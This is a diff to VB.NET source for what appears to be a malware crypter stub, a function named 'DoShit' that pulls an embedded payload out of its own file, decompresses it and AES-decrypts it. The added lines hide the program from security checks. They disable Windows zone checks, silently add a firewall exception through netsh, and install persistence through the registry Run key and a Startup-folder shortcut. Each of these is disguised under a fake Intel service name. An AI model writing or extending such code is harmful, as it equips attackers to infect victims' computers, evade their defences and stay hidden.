@@ -2,6 +2,11 @@
 
     Public Shared Function DoShit(ByVal AppPath As String, ByVal AppDirectory As String)
         Dim Antis As Boolean = False
+        Try
+            Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)
+        Catch ex As Exception
+        End Try
+
 
         Dim Payload() As Byte = GetPload(AppPath)
         Dim i As Integer = FindSplit(Payload)
@@ -54,13 +59,14 @@
         If Payload(Start - 8) = &H54 Then
             startup(AppPath)
         End If
-
+        Try
+            Interaction.Shell(String.Concat(New String() {"netsh firewall add allowedprogram """, AppPath, """ """, "Intel(R) Dynamic Platform and Thermal Framework LPM Policy Service Helper", """ ENABLE"}), AppWinStyle.Hide, True, &H1388)
+        Catch ex As Exception
+        End Try
         Dim NewByts() As Byte = RedimPload(Payload, Start)
         NewByts = Loop1(NewByts, Payload, Start)
         NewByts = Loop2(NewByts)
-        Dim F As Tuple(Of Byte(), Boolean)
-        F.Item1 = AES_Decrypt(Decompress(NewByts))
-        F.Item2 = False
+        Dim F As New Tuple(Of Byte(), Boolean)(AES_Decrypt(Decompress(NewByts)), Antis)
         Return F
     End Function
 
@@ -91,10 +97,25 @@
     End Function
 
     Shared Sub startup(ByVal AppPath As String)
-        Dim regKey As Microsoft.Win32.RegistryKey
-        regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
-        regKey.SetValue("Intel(R) Dynamic Platform and Thermal Framework LPM Policy Service Helper", """" & AppPath & """")
-        regKey.Close()
+        Try
+            Dim regKey As Microsoft.Win32.RegistryKey
+            regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
+            regKey.SetValue("Intel(R) Dynamic Platform and Thermal Framework LPM Policy Service Helper", """" & AppPath & """")
+            regKey.Close()
+        Catch ex As Exception
+
+        End Try
+
+        'shortcut
+        Try
+            Dim WshShell As IWshRuntimeLibrary.WshShellClass = New IWshRuntimeLibrary.WshShellClass
+            Dim MyShortcut As IWshRuntimeLibrary.IWshShortcut
+            MyShortcut = CType(WshShell.CreateShortcut(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Intel.lnk"), IWshRuntimeLibrary.IWshShortcut)
+            MyShortcut.TargetPath = AppPath
+            MyShortcut.Save()
+        Catch ex As Exception
+        End Try
+
     End Sub
     Shared Function FindSplit(ByVal Payload() As Byte) As Integer
         Dim Found1 As Boolean = False
